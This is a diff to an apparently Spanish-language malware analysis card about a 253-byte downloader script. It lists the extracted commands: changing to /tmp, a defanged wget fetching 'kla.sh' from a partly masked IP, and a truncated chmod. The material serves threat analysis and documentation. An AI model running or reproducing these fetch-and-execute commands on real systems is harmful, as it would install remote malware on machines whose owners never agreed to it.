@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 253 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kla.sh` en `hxxp://89.32.41.XXX/bins/kla.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 253 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `kla.sh` en `hxxp://89.32.41.XXX/bins/kla.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `cd /tmp`
+2. `wget hxxp://89.32.41.XXX/bins/kla.sh -O k`
+3. `chmod x` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8.md](../../../../../malware-like/oraculo/downloader/041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8.md)
 
 
 ## 🏷️ Clasificación
